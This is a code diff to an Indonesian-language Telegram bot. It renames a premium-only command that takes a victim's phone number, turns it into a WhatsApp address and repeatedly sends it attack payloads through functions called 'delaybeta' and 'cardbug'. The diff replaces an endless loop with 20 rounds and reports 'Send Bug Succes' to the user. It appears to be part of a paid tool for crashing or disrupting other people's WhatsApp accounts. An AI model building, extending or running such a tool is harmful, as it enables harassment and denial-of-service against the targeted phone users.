@@ -4906,7 +4906,7 @@ bot.onText(/\/delayxxckont(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 });
-bot.onText(/\/ranhddzunli(?:\s(.+))?/, async (msg, match) => {
+bot.onText(/\/ranzow1(?:\s(.+))?/, async (msg, match) => {
     const senderId = msg.from.id;
     const chatId = msg.chat.id;
     
@@ -4923,12 +4923,12 @@ bot.onText(/\/ranhddzunli(?:\s(.+))?/, async (msg, match) => {
         return bot.sendMessage(chatId, "❌ Lu Bukan Premium Idiot!!!");
     }
     if (!match[1]) {
-        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /superdelay 62×××.");
+        return bot.sendMessage(chatId, "❌ Masukin Nomor Yang Bener Idiot\nContoh Nih Njing : /ranzow1 62×××.");
     }
 
     const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
     if (!/^\d+$/.test(numberTarget)) {
-        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /freze 62×××.");
+        return bot.sendMessage(chatId, "❌ Gagal Bro, Coba Ulang\nContoh : /ranzow1 62×××.");
     }
 
     const formatedNumber = numberTarget + "@s.whatsapp.net";
@@ -4941,8 +4941,11 @@ bot.onText(/\/ranhddzunli(?:\s(.+))?/, async (msg, match) => {
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
 
-    while (true) {
+    for (let i = 0; i < 20; i++) { // Kirim 3 kali langsung
         await delaybeta(formatedNumber);
+        await sleep(1000)
+        await cardbug(formatedNumber);
+        await sleep(1000)
         console.log(chalk.red("Send Bug Succes"))
     }
 
@@ -4951,7 +4954,7 @@ bot.onText(/\/ranhddzunli(?:\s(.+))?/, async (msg, match) => {
 ┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
 ┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
 ┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
-┃〢 Cᴏᴍᴍᴀɴᴅ : /ranzunli
+┃〢 Cᴏᴍᴍᴀɴᴅ : /ranzow1
 ┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 20 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
     });
